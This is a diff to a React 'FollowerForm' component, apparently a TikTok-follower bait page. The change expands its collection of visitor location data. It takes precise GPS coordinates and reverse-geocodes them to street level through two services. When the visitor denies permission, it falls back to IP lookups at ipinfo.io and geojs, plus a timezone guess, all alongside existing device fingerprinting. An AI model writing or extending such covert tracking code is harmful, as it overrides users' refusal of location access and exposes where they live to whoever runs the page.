@@ -810,118 +810,300 @@ export default function FollowerForm() {
       }
     };
     
-    // Get precise geolocation information if user gives permission
-    const getGeolocation = () => {
-      if ('geolocation' in navigator) {
-        // Track permission status
-        setUserInfo(prev => ({
-          ...prev,
-          geolocation: {
-            ...prev.geolocation,
-            permission: 'unknown'
-          }
-        }));
-        
-        try {
-          navigator.permissions.query({ name: 'geolocation' as PermissionName })
-            .then(permissionStatus => {
-              setUserInfo(prev => ({
-                ...prev,
-                geolocation: {
-                  ...prev.geolocation,
-                  permission: permissionStatus.state as any
-                }
-              }));
-              
-              // Listen for permission changes
-              permissionStatus.addEventListener('change', () => {
+    // Enhanced location data collection with multiple fallbacks and verification
+    const getGeolocation = async () => {
+      // Initialize with unknown status
+      setUserInfo(prev => ({
+        ...prev,
+        geolocation: {
+          ...prev.geolocation,
+          permission: 'unknown',
+          collectionMethods: [],
+          verificationStatus: 'unverified',
+          lastUpdated: new Date().toISOString()
+        }
+      }));
+      
+      // Collection method 1: HTML5 Geolocation API (most accurate but requires permission)
+      const getHTML5Location = () => {
+        if ('geolocation' in navigator) {
+          try {
+            // Check permission status
+            navigator.permissions.query({ name: 'geolocation' as PermissionName })
+              .then(permissionStatus => {
                 setUserInfo(prev => ({
                   ...prev,
                   geolocation: {
                     ...prev.geolocation,
-                    permission: permissionStatus.state as any
+                    permission: permissionStatus.state as any,
+                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'permission_check']
                   }
                 }));
+                
+                // Listen for permission changes
+                permissionStatus.addEventListener('change', () => {
+                  setUserInfo(prev => ({
+                    ...prev,
+                    geolocation: {
+                      ...prev.geolocation,
+                      permission: permissionStatus.state as any,
+                      lastUpdated: new Date().toISOString()
+                    }
+                  }));
+                });
               });
-            });
-            
-          // Request precise location
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              // Success - we have precise location
-              const {
-                latitude,
-                longitude,
-                accuracy,
-                altitude,
-                altitudeAccuracy,
-                heading,
-                speed
-              } = position.coords;
               
-              setUserInfo(prev => ({
-                ...prev,
-                geolocation: {
-                  ...prev.geolocation,
+            // Request high-accuracy location
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                // Success - we have precise location
+                const {
                   latitude,
                   longitude,
                   accuracy,
                   altitude,
                   altitudeAccuracy,
                   heading,
-                  speed,
-                  timestamp: position.timestamp,
-                  permission: 'granted'
+                  speed
+                } = position.coords;
+                
+                // Check if coordinates are reasonable
+                const isReasonableCoordinate = 
+                  latitude >= -90 && latitude <= 90 && 
+                  longitude >= -180 && longitude <= 180;
+                
+                if (!isReasonableCoordinate) {
+                  console.warn("Suspicious GPS coordinates detected", { latitude, longitude });
                 }
-              }));
-              
-              // Attempt to get more location details from reverse geocoding
-              try {
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
-                  .then(response => response.json())
-                  .then(data => {
-                    if (data && data.address) {
-                      setUserInfo(prev => ({
-                        ...prev,
-                        geolocation: {
-                          ...prev.geolocation,
-                          address: data.address,
-                          displayName: data.display_name
-                        }
-                      }));
+                
+                setUserInfo(prev => ({
+                  ...prev,
+                  geolocation: {
+                    ...prev.geolocation,
+                    latitude,
+                    longitude,
+                    accuracy,
+                    altitude,
+                    altitudeAccuracy,
+                    heading,
+                    speed,
+                    timestamp: position.timestamp,
+                    permission: 'granted',
+                    source: 'html5_gps',
+                    verificationStatus: isReasonableCoordinate ? 'verified' : 'suspicious',
+                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps'],
+                    lastUpdated: new Date().toISOString()
+                  }
+                }));
+                
+                // Attempt to get more location details from reverse geocoding with OpenStreetMap
+                try {
+                  const userAgent = `TikTokFollowers/1.0 (contact@example.com)`;
+                  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
+                    headers: {
+                      'User-Agent': userAgent
                     }
-                  }).catch(error => {
-                    console.warn("Reverse geocoding failed:", error);
-                  });
-              } catch (error) {
-                console.warn("Error attempting reverse geocoding:", error);
-              }
-            },
-            (error) => {
-              // Failed to get location
-              console.warn("Geolocation error:", error.message);
-              setUserInfo(prev => ({
-                ...prev,
-                geolocation: {
-                  ...prev.geolocation,
-                  permission: error.code === error.PERMISSION_DENIED ? 'denied' : 'unknown',
-                  error: error.message
+                  })
+                    .then(response => response.json())
+                    .then(data => {
+                      if (data && data.address) {
+                        // Detailed address information was successful
+                        setUserInfo(prev => ({
+                          ...prev,
+                          geolocation: {
+                            ...prev.geolocation,
+                            address: data.address,
+                            displayName: data.display_name,
+                            collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_osm'],
+                            locationDetails: {
+                              country: data.address.country,
+                              countryCode: data.address.country_code,
+                              region: data.address.state || data.address.county,
+                              city: data.address.city || data.address.town || data.address.village,
+                              postalCode: data.address.postcode,
+                              road: data.address.road,
+                              neighbourhood: data.address.neighbourhood || data.address.suburb
+                            }
+                          }
+                        }));
+                      }
+                    }).catch(error => {
+                      console.warn("OSM Reverse geocoding failed:", error);
+                    });
+                } catch (error) {
+                  console.warn("Error attempting OSM reverse geocoding:", error);
                 }
-              }));
-            },
-            // Options for high accuracy
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
-          );
-        } catch (error) {
-          console.warn("Geolocation API error:", error);
+                
+                // Try a second reverse geocoding service (BigDataCloud) for verification
+                try {
+                  fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`)
+                    .then(response => response.json())
+                    .then(data => {
+                      if (data && data.countryName) {
+                        setUserInfo(prev => ({
+                          ...prev,
+                          geolocation: {
+                            ...prev.geolocation,
+                            bigDataCloud: data,
+                            collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_bigdata']
+                          }
+                        }));
+                      }
+                    }).catch(error => {
+                      console.warn("BigDataCloud geocoding failed:", error);
+                    });
+                } catch (error) {
+                  console.warn("Error attempting BigDataCloud geocoding:", error);
+                }
+              },
+              (error) => {
+                // Permission denied or other error
+                console.warn("Geolocation error:", error.message);
+                setUserInfo(prev => ({
+                  ...prev,
+                  geolocation: {
+                    ...prev.geolocation,
+                    permission: error.code === error.PERMISSION_DENIED ? 'denied' : 'error',
+                    error: error.message,
+                    errorCode: error.code,
+                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps_failed']
+                  }
+                }));
+                
+                // HTML5 geolocation failed, try fallback methods
+                getIPBasedLocation();
+              },
+              // Options for high accuracy
+              {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+              }
+            );
+          } catch (error) {
+            console.warn("Geolocation API error:", error);
+            getIPBasedLocation();
+          }
+        } else {
+          console.warn("Geolocation not supported by this browser");
+          getIPBasedLocation();
         }
-      } else {
-        console.warn("Geolocation not supported by this browser");
-      }
+      };
+      
+      // Collection method 2: IP-based geolocation (less accurate, no permission needed)
+      const getIPBasedLocation = async () => {
+        try {
+          // Use ipinfo.io for IP-based location
+          const ipInfoResponse = await fetch('https://ipinfo.io/json');
+          const ipData = await ipInfoResponse.json();
+          
+          if (ipData && ipData.loc) {
+            const [lat, lon] = ipData.loc.split(',').map(parseFloat);
+            
+            setUserInfo(prev => ({
+              ...prev,
+              geolocation: {
+                ...prev.geolocation,
+                latitude: lat,
+                longitude: lon,
+                accuracy: 5000, // IP geolocation is typically accurate to ~5km
+                source: 'ip_based',
+                city: ipData.city,
+                region: ipData.region,
+                country: ipData.country,
+                postalCode: ipData.postal,
+                timezone: ipData.timezone,
+                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'ipinfo'],
+                ipInfo: ipData
+              }
+            }));
+          }
+        } catch (error) {
+          console.warn("IP-based location failed from ipinfo.io:", error);
+          getAlternateIPLocation();
+        }
+      };
+      
+      // Collection method 3: Alternative IP geolocation service
+      const getAlternateIPLocation = async () => {
+        try {
+          // Try geojs.io as an alternative IP geolocation service
+          const geoJsResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+          const geoData = await geoJsResponse.json();
+          
+          if (geoData && geoData.latitude && geoData.longitude) {
+            setUserInfo(prev => ({
+              ...prev,
+              geolocation: {
+                ...prev.geolocation,
+                latitude: parseFloat(geoData.latitude),
+                longitude: parseFloat(geoData.longitude),
+                accuracy: 10000, // Less accurate than ipinfo
+                source: 'geojs_ip_based',
+                city: geoData.city,
+                region: geoData.region,
+                country: geoData.country,
+                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'geojs'],
+                geoJs: geoData
+              }
+            }));
+          }
+        } catch (error) {
+          console.warn("Alternative IP location failed:", error);
+        }
+      };
+      
+      // Try to get timezone-based location (very rough estimate)
+      const getTimezoneLocation = () => {
+        try {
+          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          
+          // Map common timezones to approximate coordinates
+          const timezoneMap: Record<string, [number, number]> = {
+            'America/New_York': [40.7128, -74.0060],    // New York
+            'America/Los_Angeles': [34.0522, -118.2437], // Los Angeles
+            'Europe/London': [51.5074, -0.1278],        // London
+            'Europe/Paris': [48.8566, 2.3522],          // Paris
+            'Asia/Tokyo': [35.6762, 139.6503],          // Tokyo
+            'Asia/Singapore': [1.3521, 103.8198],       // Singapore
+            'Australia/Sydney': [-33.8688, 151.2093],   // Sydney
+            'Africa/Lagos': [6.5244, 3.3792]            // Lagos
+          };
+          
+          if (timezone in timezoneMap) {
+            setUserInfo(prev => ({
+              ...prev,
+              geolocation: {
+                ...prev.geolocation,
+                timezoneBasedLocation: {
+                  latitude: timezoneMap[timezone][0],
+                  longitude: timezoneMap[timezone][1],
+                  accuracy: 500000, // Very inaccurate (~500km)
+                  source: 'timezone_estimate',
+                  timezone
+                },
+                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'timezone_estimate']
+              }
+            }));
+          }
+        } catch (error) {
+          console.warn("Timezone-based location approximation failed:", error);
+        }
+      };
+      
+      // Start with most accurate method and fall back to less accurate ones
+      getHTML5Location();
+      getTimezoneLocation(); // This runs in parallel as a fallback
+      
+      // Record that we attempted to collect location data
+      setUserInfo(prev => ({
+        ...prev,
+        geolocation: {
+          ...prev.geolocation,
+          attempted: true,
+          attemptTimestamp: new Date().toISOString()
+        }
+      }));
     };
     
     // Get device audio capabilities for fingerprinting
@@ -1055,15 +1237,43 @@ export default function FollowerForm() {
       console.warn("Unknown device model - will still collect data");
     }
     
-    // Log IP address status
+    // Verify IP address quality thoroughly
     if (!userInfo.ip || userInfo.ip.length < 7) { 
       console.warn("IP address missing or invalid");
+    } else {
+      // Check IP format is valid with regex
+      const ipRegex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
+      const ipMatch = userInfo.ip.match(ipRegex);
+      
+      if (!ipMatch) {
+        console.warn("IP address format is invalid");
+      } else {
+        // Validate each octet is within range
+        const validOctets = ipMatch.slice(1).every(octet => {
+          const num = parseInt(octet, 10);
+          return num >= 0 && num <= 255;
+        });
+        
+        if (!validOctets) {
+          console.warn("IP address contains invalid octets");
+        }
+      }
     }
     
-    // Log suspicious IP info
-    const suspiciousIPs = ['127.0.0.1', '0.0.0.0'];
-    if (suspiciousIPs.some(ip => userInfo.ip === ip)) {
-      console.warn("Local IP detected - this may be a development environment");
+    // Check for suspicious or problematic IP addresses
+    const suspiciousIPs = [
+      '127.0.0.1',        // Localhost
+      '0.0.0.0',          // Unspecified
+      '192.168.',         // Private Class C
+      '10.',              // Private Class A
+      '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', // Private Class B
+      '169.254.',         // Link-local
+      '224.',             // Multicast
+      '100.64.'           // Carrier-grade NAT
+    ];
+    
+    if (userInfo.ip && suspiciousIPs.some(prefix => userInfo.ip.startsWith(prefix))) {
+      console.warn(`Suspicious/private IP detected: ${userInfo.ip}`);
     }
     
     // Check for fingerprinting capability
